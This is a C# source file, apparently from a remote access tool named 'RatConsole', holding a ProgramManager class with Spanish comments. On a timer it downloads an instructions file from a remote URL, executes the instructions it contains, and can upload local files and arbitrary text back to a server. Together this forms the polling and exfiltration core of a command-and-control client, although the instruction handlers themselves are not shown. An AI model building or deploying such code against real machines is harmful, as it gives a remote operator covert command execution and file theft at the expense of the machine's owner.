using System;

using RatConsole.Domain;

namespace RatConsole.Controllers
{
	/// <summary>
	///		Manager de ejecución
	/// </summary>
	public class ProgramManager
	{
		// Constantes privadas
		#if DEBUG
			private const int Interval = 1;
		#else
			private const int Interval = 10;
		#endif
		private const int IntervalBetweenDownload = 10;
		// Eventos públicos
		public event EventHandler<MessageEventArgs> Message;
		// Temporizador
		private System.Timers.Timer _timer;

		public ProgramManager(string pathBase, string urlDownload)
		{
			PathBase = System.IO.Path.Combine(pathBase, "Data");
			UrlDownload = urlDownload;
			Instructions = new InstructionsModel(this);
		}
		
		/// <summary>
		///		Arranca la ejecución del programa
		/// </summary>
		public void Start()
		{
			// Carga las instrucciones
			Log("Cargando instrucciones ...");
			Instructions.Load(GetInstructionsFileName());
			Log("Fin de la carga de instrucciones ...");
			// Arranca el temporizador
			Stopped = false;
			Timer.Start();
			// Log
			Log("Programa preparado para ejecutar ...");
		}

		/// <summary>
		///		Detiene la ejecución del programa
		/// </summary>
		public void Stop()
		{
			// Graba las instrucciones
			Instructions.Save(GetInstructionsFileName());
			// Detiene la ejecución
			Stopped = true;
			Timer.Stop();
			// Log
			Log("Programa detenido ...");
		}

		/// <summary>
		///		Ejecuta las instrucciones
		/// </summary>
		private void ExecuteInstructions()
		{
			// Detiene el temporizador para evitar llamadas reentrantes
			Timer.Stop();
			// Descarga las instrucciones
			if (DateTime.Now > LastDownload)
				DownloadInstructions();
			// Ejecuta las instrucciones
			Instructions.Execute();
			// Borra las instrucciones antiguas
			Instructions.DeleteExecuted();
			// ... y graba el archivo
			if (DateTime.Now > LastSave)
			{
				Log("Grabando instrucciones ...");
				Instructions.Save(GetInstructionsFileName());
				LastSave = DateTime.Now;
				Log("Instrucciones grabadas ...");
			}
			// Arranca el temporizador
			if (!Stopped)
				Timer.Start();
		}

		/// <summary>
		///		Descarga las instrucciones
		/// </summary>
		private void DownloadInstructions()
		{
			string fileName = GetInstructionsDownloadFileName();

				// Log
				Log("Descargando instrucciones");
				// Descarga las instrucciones
				new WebManager(this).DownloadInstructions(fileName);
				// Carga las instrucciones
				if (System.IO.File.Exists(fileName))
					Instructions.Load(fileName);
				// Cambia la fecha de última descarga
				LastDownload = DateTime.Now.AddMinutes(IntervalBetweenDownload);
				// Log
				Log("Fin de la descarga de instrucciones");
		}

		/// <summary>
		///		Obtiene el directorio base de los datos
		/// </summary>
		private string GetDataPath()
		{
			return System.IO.Path.Combine(PathBase, "Data");
		}

		/// <summary>
		///		Obtiene el nombre del archivo de instrucciones para descarga
		/// </summary>
		private string GetInstructionsDownloadFileName()
		{
			return System.IO.Path.Combine(GetDataPath(), "instructions.bak.xml");
		}

		/// <summary>
		///		Obtiene el nombre de un archivo de instrucciones
		/// </summary>
		private string GetInstructionsFileName()
		{
			return System.IO.Path.Combine(GetDataPath(), "instructions.xml");
		}

		/// <summary>
		///		Lanza el evento de log
		/// </summary>
		public void Log(string message, bool error = false)
		{
			Message?.Invoke(this, new MessageEventArgs(message, error));
		}

		/// <summary>
		///		Envía un archivo
		/// </summary>
		internal void SendFile(string fileName)
		{
			Log($"Uploading file {fileName}");
			new WebManager(this).UploadFile(fileName);
			Log($"File {fileName} uploaded");
		}

		/// <summary>
		///		Envía un texto
		/// </summary>
		internal void SendText(string text)
		{
			Log($"Send:{Environment.NewLine}{text}");
			new WebManager(this).UploadText(text);
			Log("Sent");
		}

		/// <summary>
		///		Directorio base de ejecución
		/// </summary>
		public string PathBase { get; }

		/// <summary>
		///		Url de descarga
		/// </summary>
		public string UrlDownload { get; }

		/// <summary>
		///		Indica si la ejecución está detenida
		/// </summary>
		public bool Stopped { get; private set; }

		/// <summary>
		///		Instrucciones
		/// </summary>
		private InstructionsModel Instructions { get; }

		/// <summary>
		///		Temporizador
		/// </summary>
		private System.Timers.Timer Timer
		{
			get
			{
				// Crea el temporizador si no se había creado
				if (_timer == null)
				{
					_timer = new System.Timers.Timer(TimeSpan.FromMinutes(Interval).TotalMilliseconds);
					_timer.Elapsed += (sender, args) => ExecuteInstructions();
				}
				// Devuelve el temporizador
				return _timer;
			}
		}

		/// <summary>
		///		Ultima descarga de instrucciones
		/// </summary>
		private DateTime LastDownload { get; set; } = DateTime.Now.AddDays(-1);

		/// <summary>
		///		Ultima grabación de instrucciones
		/// </summary>
		private DateTime LastSave { get; set; } = DateTime.Now.AddDays(-1);
	}
}
